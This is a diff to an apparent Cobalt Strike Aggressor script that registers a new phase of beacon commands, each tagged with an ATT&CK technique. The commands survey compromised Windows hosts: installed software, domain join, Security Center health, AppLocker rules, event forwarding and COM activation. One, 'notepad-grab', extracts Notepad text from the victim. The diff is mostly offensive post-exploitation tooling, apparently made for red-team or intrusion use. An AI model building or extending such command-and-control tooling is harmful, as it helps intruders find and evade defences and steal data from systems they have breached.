@@ -3165,6 +3165,44 @@ beacon_command_register(
 # Phase 12 — XLL persistence
 # ============================================================
 
+# ============================================================
+# Phase 13 — Adrenaline discovery gap-fill
+# ============================================================
+
+alias app-count { dani_run($1, "app-count", ""); }
+beacon_command_register("app-count", "Count installed application entries — T1518", "Synopsis: app-count\n\nArgs: none");
+
+alias netjoin-query { dani_run($1, "netjoin-query", ""); }
+beacon_command_register("netjoin-query", "Query domain/workgroup join state — T1016", "Synopsis: netjoin-query\n\nArgs: none");
+
+alias power-state { dani_run($1, "power-state", ""); }
+beacon_command_register("power-state", "Query AC/battery state and form factor — T1082", "Synopsis: power-state\n\nArgs: none");
+
+alias wsc-status { dani_run($1, "wsc-status", ""); }
+beacon_command_register("wsc-status", "Query Windows Security Center health — T1518.001", "Synopsis: wsc-status\n\nArgs: none");
+
+alias applocker-policy { dani_run($1, "applocker-policy", ""); }
+beacon_command_register("applocker-policy", "Enumerate AppLocker enforcement — T1069.001", "Synopsis: applocker-policy\n\nArgs: none");
+
+alias wef-detect { dani_run($1, "wef-detect", ""); }
+beacon_command_register("wef-detect", "Detect Windows Event Forwarding — T1518.001", "Synopsis: wef-detect\n\nArgs: none");
+
+alias wallpaper-enum { dani_run($1, "wallpaper-enum", ""); }
+beacon_command_register("wallpaper-enum", "Display the current wallpaper path — T1016", "Synopsis: wallpaper-enum\n\nArgs: none");
+
+alias mdm-policy-artifacts { dani_run($1, "mdm-policy-artifacts", ""); }
+beacon_command_register("mdm-policy-artifacts", "Score MDM enrollment artifacts — T1082", "Synopsis: mdm-policy-artifacts\n\nArgs: none");
+
+alias com-probe {
+    local('$args');
+    $args = bof_pack($1, "z", $2);
+    dani_run($1, "com-probe", $args);
+}
+beacon_command_register("com-probe", "Probe COM class activation — T1218", "Synopsis: com-probe <CLSID>\n\nArgs: CLSID string");
+
+alias notepad-grab { dani_run($1, "notepad-grab", ""); }
+beacon_command_register("notepad-grab", "Extract classic Notepad text — T1005", "Synopsis: notepad-grab\n\nArgs: none");
+
 # --- xll-persist ---
 alias xll-persist {
     local('$bid $sub $path $args');
